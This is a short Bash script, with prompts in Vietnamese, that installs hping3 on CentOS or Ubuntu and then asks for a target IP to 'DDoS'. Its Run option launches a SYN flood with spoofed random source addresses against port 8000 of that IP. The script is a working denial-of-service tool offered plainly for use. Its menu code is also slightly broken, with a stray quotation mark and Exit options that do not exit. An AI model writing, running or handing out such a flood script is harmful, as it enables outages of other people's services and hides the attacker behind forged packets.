#!/bin/bash
clear
PS3="Chọn hệ điều hành Linux để cài hping3 :"
opt=("Centos" "Ubuntu" "Check HDH" "Exit")
select menu in "${opt[@]}"
do
        case $menu in
        "Centos")
        opt1=("Setup" "Run" " "Exit")
        select menu1 in "${opt1[@]}"
        do
                case $menu1 in
                "Setup")
                        echo " Tiến trình đang chạy "
                        sudo yum install hping3 -y
                ;;
                "Run")
                printf " Điền IP cần DDos : "
                read n
                sudo hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                ;;
                "Exit")
                echo "$REPLY"
                ;;
        esac
        done
        ;;
        "Ubuntu")
        opt2=("Setup" "Run" "Exit")
        select menu2 in "${opt2[@]}"
        do
                case $menu2 in
                "Setup")
                        echo " Tiến trình đang chạy "
                        sudo apt-get install hping3 -y
                 ;;
                "Run")
                printf " Điền IP cần DDos : "
                read n
                sudo hping3 -c 10000 -d 128 -S -w 64 -p 8000 --flood --rand-source $n
                ;;
                "Exit")
                echo "$REPLY"
                ;;
        esac
        done
        ;;
        "Check HDH")
                echo " Hệ điều hành bạn đang sử dụng :"
                cat /etc/os-release
        ;;
        "Exit")
                break
        ;;
        *) echo "Vui lòng thử lại $REPLY"
;;
esac
done
